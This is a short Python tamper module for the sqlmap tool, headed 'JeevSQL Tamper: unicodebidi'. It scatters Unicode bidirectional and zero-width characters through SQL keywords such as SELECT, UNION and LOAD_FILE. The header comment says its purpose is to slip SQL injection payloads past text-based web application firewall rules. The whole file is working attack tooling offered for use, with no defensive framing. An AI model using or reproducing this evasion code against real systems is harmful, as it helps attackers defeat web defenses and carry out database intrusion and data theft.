#!/usr/bin/env python
# JeevSQL Tamper: unicodebidi - by Jeevraj
# Inserts Unicode BiDi control characters into SQL keywords to bypass text-based WAF rules.
from lib.core.enums import PRIORITY
import random, re

__priority__ = PRIORITY.NORMAL

BIDI_CHARS = [u'\u202a', u'\u202b', u'\u200e', u'\u200f', u'\u202c', u'\u200b']
SQL_KEYWORDS = ['SELECT','UNION','INSERT','UPDATE','DELETE','FROM','WHERE','AND','OR','NOT','IN',
    'EXISTS','LIKE','BETWEEN','NULL','CAST','CONVERT','CHAR','CONCAT','VERSION','DATABASE',
    'USER','SLEEP','BENCHMARK','LOAD_FILE','INTO','OUTFILE','EXEC','EXECUTE']

def dependencies(): pass

def tamper(payload, **kwargs):
    if not payload:
        return payload
    result = payload
    for kw in SQL_KEYWORDS:
        if kw.lower() in result.lower():
            def ins(m):
                w = m.group(0)
                b = random.choice(BIDI_CHARS)
                return w[0] + b + w[1:]
            result = re.sub(re.escape(kw), ins, result, flags=re.IGNORECASE)
    return result
